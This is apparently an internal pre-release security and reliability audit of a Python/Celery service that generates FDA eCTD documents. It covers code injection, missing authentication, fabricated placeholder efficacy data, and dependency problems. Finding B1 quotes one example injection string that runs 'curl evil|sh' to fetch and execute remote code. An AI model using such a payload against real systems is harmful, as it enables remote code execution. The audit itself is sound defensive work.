# GA Readiness Audit — Python Backend Services

Date: 2026-06-14
Auditor: Python backend-services specialist
Scope: `services/*.py`, `workers/artifact-compute/`, `server/faers-bridge.js`, `server/scripts/`, requirements files, Celery/worker reliability, sandbox safety, eCTD artifact correctness.

## Executive Summary

The Python microservice tier is small (~7 core files) and architecturally reasonable: a FastAPI front door (`api.py`) enqueues Celery tasks (`celery_app.py`) that run a DOCX generator inside a Docker sandbox (`secure_runner.py`). The sandbox design itself is sound (`--network none`, memory/CPU caps, read-only mounts, non-root image user, hard timeout). However there are **GA-blocking defects** in three areas:

1. **Code injection in `server/faers-bridge.js`** — confirms the parallel auditor's report. User-supplied `ndcCode`/`productName` are string-interpolated into Python source and executed. (Currently no live caller, so latent, but ships in the tree.)
2. **No authentication or input validation on `services/api.py`** — every endpoint is open; `template_path` is an attacker-controlled host path passed straight into a read-only Docker mount and `python-docx Document()`.
3. **`ectd_generator.py` silently fabricates clinical efficacy data** — when input lacks tables, it emits hardcoded placeholder systolic-BP endpoint numbers into a regulated Module 2.7.3 artifact with no watermark/flag. **Confirmed** at lines 236-247 / 402-413.

Plus reliability gaps (no Celery retries/idempotency/acks_late, result-backend mismatch with the job store) and a **broken `server/requirements.txt`** that points at a non-existent file.

**Verdict: NOT READY.** Blockers 1-3 must be fixed before GA.

## BLOCKER findings

### [BLOCKER] B1 — Python code injection via string interpolation in faers-bridge.js
**File:** `server/faers-bridge.js:24-58`
**Impact:** `ndcCode` and `productName` are concatenated directly into a Python source string (`ndc_code = "${ndcCode}"`, `product_name = "${productName}"`), written to `temp_faers_script.py`, then executed with `spawn('python', [tempScriptPath])`. Any value containing `"` plus newline (e.g. `"; import os; os.system('curl evil|sh') #`) executes arbitrary code on the host with the server's privileges. This is a textbook RCE. `fs.writeFileSync` to a fixed `process.cwd()/temp_faers_script.py` is also a race/clobber hazard under concurrency.
**Current exposure:** `generateCERFromFAERS` is exported but has no live call site in the tree today — so it is *latent*. It must not ship as-is; if any route is later wired to it, this becomes a live RCE.
**Fix:** Do not generate source code. Pass `ndcCode`/`productName` as `argv` to a *static* `faers_runner.py` (`spawn('python',['faers_runner.py', ndcCode, productName||''])`) and read them via `sys.argv`. Validate `ndcCode` against `^\d{4,5}-\d{3,4}-\d{1,2}$`. Delete the temp-script mechanism entirely.

### [BLOCKER] B2 — No authentication and unvalidated host-path on services/api.py
**File:** `services/api.py:21-35` (and all routes)
**Impact:** None of `/api/ectd/generate`, `/smoke`, `/status`, `/download` require auth — anyone who can reach the service can enqueue jobs and download other tenants' generated documents by guessing/enumerating `job_id`. Worse, `GenerateRequest.template_path` (line 18) is a free-form string forwarded through Celery into `run_container` where it is `_abs_path`-resolved and bind-mounted `:ro` into the container *and* loaded by `python-docx Document(template_path)`. An attacker controls which host file is read as a "template": information disclosure of arbitrary readable host files into the output DOCX, and SSRF-of-filesystem. `/api/ectd/download` returns any path recorded in the job store with no tenant scoping.
**Fix:** Add auth dependency (API key / JWT) on every route. Reject or whitelist `template_path` to a server-managed templates dir (resolve and assert `path.is_relative_to(TEMPLATES_DIR)`). Scope `job_id` to the authenticated principal in the job store. Validate `req.data` size/shape.

### [BLOCKER] B3 — ectd_generator fabricates placeholder clinical efficacy data
**File:** `services/ectd_generator.py:236-240`, `243-247`, `402-406`, `409-413`
**Impact:** **Confirmed.** When the input JSON has no `tables` (or no `data` at all), the generator inserts a hardcoded "Primary Efficacy Endpoints" table with invented numbers — `Mean systolic BP change −5.2 ± 1.1 / −3.8 ± 1.2` and `62% / 49%` — plus a hardcoded Methods paragraph ("Randomized, double-blind … ANCOVA"). This is written into a document titled "Module 2.7.3 Clinical Summary" with a footer "Generated by Concept2Cure eCTD Co-Author". There is no watermark, no "EXAMPLE/DRAFT" marker, and the API returns it as `COMPLETED`. Shipping fabricated efficacy data inside a regulated FDA submission artifact is a falsification/data-integrity risk (21 CFR Part 11 / GxP) and could mislead a reviewer or, worse, be submitted.
**Fix:** Remove the fabricated fallback entirely. If `tables` is missing/empty, either (a) raise and mark the job FAILED with a clear "no clinical data supplied" error, or (b) emit a clearly-watermarked DRAFT with literal placeholder tokens (e.g. `[[INSERT PRIMARY ENDPOINT DATA]]`) that cannot be mistaken for real results. Never emit plausible-looking fake numbers.

## HIGH findings

### [HIGH] H1 — Celery tasks have no retry / acks_late / idempotency
**File:** `services/celery_app.py:18-19, 66`
**Impact:** Tasks are declared `@app.task(bind=True)` with no `autoretry_for`, `max_retries`, `retry_backoff`, `acks_late`, or `task_reject_on_worker_lost`. With the default early-ack behavior, a worker crash (OOM kill from the 512m container, SIGKILL, redeploy) mid-task **loses the job silently** — the message is already acked and the job is stuck in `PROCESSING` forever; the API will poll indefinitely. Transient Docker daemon hiccups are not retried. No idempotency key, so a redelivered task regenerates into a *new* temp dir, orphaning the prior output.
**Fix:** Set `acks_late=True`, `task_reject_on_worker_lost=True`, add `autoretry_for=(RunnerError,)` with bounded `max_retries` + backoff, and make output dir deterministic per `job_id` so retries are idempotent. Add a janitor/timeout to fail jobs stuck in `PROCESSING`.

### [HIGH] H2 — No global Celery config: serializer, time limits, dead-letter, visibility timeout
**File:** `services/celery_app.py:14`
**Impact:** `Celery(...)` is created with only broker/backend. No `task_time_limit`/`task_soft_time_limit` (a hung container's wrapper could pin a worker beyond the 30s subprocess timeout), no `worker_max_tasks_per_child` (memory leaks accumulate), no `task_acks_on_failure_or_timeout`, no dead-letter routing. Default Redis `visibility_timeout` (1h) means a task that runs <1h but whose worker dies can be redelivered and run twice concurrently. Default pickle-free JSON serializer is fine, but it isn't pinned explicitly.
**Fix:** Add `app.conf.update(task_serializer="json", accept_content=["json"], result_serializer="json", task_time_limit=120, task_soft_time_limit=90, worker_max_tasks_per_child=50, broker_transport_options={"visibility_timeout": 3600})` and a dead-letter strategy.

### [HIGH] H3 — Job store and result backend can diverge; non-atomic, no TTL
**File:** `services/job_store.py:36-43`, `services/api.py:30`, `services/celery_app.py:45`
**Impact:** Job state is tracked in *two* places — the custom `RedisJobStore` (hash `ectd:job:{id}`) and Celery's own result backend (db 1) — which can disagree. `RedisJobStore.set` overwrites the whole hash each call but `api.py` pre-seeds `{"status","input"}` while the worker writes `{"status","output"}`, so the `input` field is lost on the PROCESSING write (`store.set(job_id, {"status":"PROCESSING"})` at celery_app.py:23 drops it). Keys have no TTL → unbounded Redis growth. `InMemoryJobStore` fallback (job_store.py:48-56) means in any deployment where Redis is briefly unreachable at import time, **state silently goes process-local** and the API and worker (separate processes) will never see each other's job state — every job appears 404/stuck. Values are coerced with `str(v)` so nested data is stringified lossily.
**Fix:** Single source of truth. Use `hset` field-level updates (not whole-hash overwrite), set TTL, and fail loudly (not fall back to in-memory) when Redis is required in production.

### [HIGH] H4 — Broken/dangling server/requirements.txt
**File:** `server/requirements.txt:1`
**Impact:** Contains `-r services/python/requirements.txt`, but `services/python/` does not exist in the repo. Any `pip install -r server/requirements.txt` fails outright, breaking server Python dependency provisioning / CI / Docker builds that rely on it.
**Fix:** Point to the real file (`-r ../requirements.txt` or `-r ../services/requirements.txt`) or inline the deps. Add a CI check that all `requirements*.txt` install cleanly.

### [HIGH] H5 — secure_runner mounts host paths without symlink/ownership checks; container can write arbitrary host dir
**File:** `services/secure_runner.py:78-85`
**Impact:** `output_dir` is `_abs_path`-resolved and bind-mounted `rw` into the container at `/app/output`; `data_json` and `template_docx` are mounted `:ro`. The container runs as uid 10001 (`docgen`), but the bind source is a host path chosen by the caller chain (ultimately influenced by `template_path`/job input). There is no check that these paths are inside an allowed base dir, are not symlinks pointing elsewhere, and the `rw` output mount lets the sandboxed generator write anywhere the mounted host dir resolves to. Combined with B2 (unvalidated `template_path`) this widens the blast radius. Also no `--read-only` root FS, no `--cap-drop ALL`, no `--security-opt no-new-privileges`, no `--pids-limit` on the container — the sandbox is weaker than it should be for "untrusted generated code."
**Fix:** Confine all mount sources under a dedicated jobs root and assert containment after `resolve()`. Add `--read-only`, `--cap-drop=ALL`, `--security-opt=no-new-privileges`, `--pids-limit=128`, and `--tmpfs /tmp`. Consider `--user` pinning explicitly.

## MEDIUM findings

### [MEDIUM] M1 — Broad `except Exception` swallows errors and returns stringified internals to clients
**File:** `services/celery_app.py:56-63, 92-95`; `services/job_store.py:8, 54`
**Impact:** Worker catches `Exception` and stores `error=str(e)` which is then surfaced verbatim via `/api/ectd/status` (api.py:50-59) — leaking stack/path details to clients. `job_store.py:8` swallows any redis import error; `:54` swallows any connection error and silently degrades to in-memory (see H3).
**Fix:** Log full exception server-side, return a generic error id to clients, narrow excepts.

### [MEDIUM] M2 — Unpinned, broad root requirements with floor-only constraints
**File:** `requirements.txt` (all lines)
**Impact:** Every dependency uses `>=` (e.g. `PyMuPDF>=1.27`, `openai>=2.37`, `pydantic>=2.13`, `numpy>=2.4`, `pandas>=3.0`), so builds are non-reproducible and a future malicious/breaking release is auto-pulled. Several version floors look implausibly high / possibly typo'd (`pdfminer.six>=20260107` is a future-dated build, `opencv-python-headless>=4.13.0.92`) and may be uninstallable, breaking the PDF pipeline. No hashes, no lockfile.
**Fix:** Pin exact versions (`==`) + hashes (pip-tools/uv lock). Verify the future-dated floors resolve.

### [MEDIUM] M3 — PyPDF2 is deprecated/EOL
**File:** `requirements.txt` (`PyPDF2>=3.0.0`)
**Impact:** PyPDF2 is no longer maintained (superseded by `pypdf`); it has a history of CVEs (infinite loops / DoS on crafted PDFs). Used as a fallback extractor on untrusted uploaded PDFs in `ingestion/pdf_extractor.py`.
**Fix:** Migrate to maintained `pypdf`.

### [MEDIUM] M4 — `requests` floor version 2.34.2 likely invalid; no timeouts pattern enforced
**File:** `services/requirements.txt` (`requests==2.34.2`)
**Impact:** `requests` 2.34.2 is not a real released version (latest 2.x line is ~2.32.x as of cutoff) — the pin may fail to install. Separately `scripts/e2e_staging_smoke.py:360` uses `requests.get(..., verify=False)` (TLS verification disabled).
**Fix:** Correct the pin to a real version; remove `verify=False` (M-tagged below).

### [MEDIUM] M5 — TLS verification disabled
**File:** `scripts/e2e_staging_smoke.py:360`
**Impact:** `requests.get("http://localhost:8080/certs", verify=False)` disables cert validation. Even against localhost, `verify=False` in code tends to be copy-pasted into prod paths and triggers MITM exposure. (Scoped to a smoke test, hence MEDIUM not HIGH.)
**Fix:** Remove `verify=False`; the URL is `http://` anyway so it's also dead/misleading.

### [MEDIUM] M6 — ectd_generator: two functions with the same name; first `generate_clinical_summary` is shadowed
**File:** `services/ectd_generator.py:219` vs `373`
**Impact:** `generate_clinical_summary` is defined twice; the second definition (line 373) silently overrides the first. Dead code at 219-264 is confusing and a maintenance hazard; if anyone imports/relies on the first signature they get the second. Indicates the file hasn't been cleaned and tested as the single source.
**Fix:** Delete the obsolete first definition.

## LOW findings

### [LOW] L1 — `docx2txt>=0.9` and other extractors run on untrusted DOCX without resource bounds
**File:** `requirements.txt`; `ingestion/pdf_extractor.py`
**Impact:** Untrusted document parsing (zip-bomb / decompression DoS) has no size guards visible in the extractor entry path. Lower priority than the sandboxed generator but worth bounding.
**Fix:** Enforce max file size / page count before extraction.

### [LOW] L2 — `_safe_filename` allows empty/long names; title flows into header unescaped
**File:** `workers/artifact-compute/docx-python-runtime.py:286-287`
**Impact:** A title of only special chars yields an empty filename; no length cap. Low impact (DOCX-internal), but can produce odd `.docx` names downstream.
**Fix:** Default + truncate.

### [LOW] L3 — `datetime.utcnow()` deprecated; non-deterministic output timestamps
**File:** `workers/artifact-compute/docx-python-runtime.py:43, 93`
**Impact:** `datetime.utcnow()` is deprecated (3.12+) and the embedded `generated_at` makes output non-byte-deterministic, complicating reproducible-artifact verification for regulated outputs.
**Fix:** Use `datetime.now(timezone.utc)`; allow a fixed/injected timestamp for deterministic builds.

## Positive observations
- `secure_runner.run_container` correctly uses `--network none`, `--memory`, `--cpus`, read-only input mounts, a hard `subprocess` timeout, and kills the container on timeout (secure_runner.py:66-98). Generator image runs as non-root uid 10001 (`services/Dockerfile`).
- `subprocess.run` calls use **list-form argv (no `shell=True`)** throughout the Python services — no shell injection in the Python tier (the injection is in the JS bridge, B1).
- No `eval`/`exec`/`os.system`/`pickle` of untrusted data in the Python services.
- API/worker Docker images create and drop to non-root users.
